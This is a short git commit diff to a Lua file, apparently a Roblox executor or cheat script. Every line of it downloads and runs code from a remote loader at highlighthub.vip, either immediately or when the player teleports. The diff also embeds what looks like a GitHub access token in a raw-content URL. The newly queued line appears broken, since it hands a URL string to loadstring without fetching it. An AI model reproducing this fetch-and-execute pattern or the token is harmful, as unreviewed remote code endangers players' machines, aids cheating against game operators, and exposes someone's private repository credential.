0ff9cef4d989a394ec7174dbd8b33cee7cccc30a
xanyboyo <m.usicboyoalt@gmail.com>
2025-11-18 19:11:21 -0500

    Update ohyea.lua

--- ohyea.lua
+++ ohyea.lua
@@ -1,1 +1,2 @@
-queue_on_teleport("setfpscap(30)loadstring(game:HttpGet(\"https://www.highlighthub.vip/api/get-loader?id=cv0k2d\"))()")
+loadstring("setfpscap(30)loadstring(game:HttpGet(\"https://www.highlighthub.vip/api/get-loader?id=cv0k2d\"))()")
+queue_on_teleport("loadstring(\"https://raw.githubusercontent.com/xanyboyo/private/refs/heads/main/ohyea.lua?token=GHSAT0AAAAAADPMWF5YW4COKVZOUX37RLUY2I5BLXQ\")")
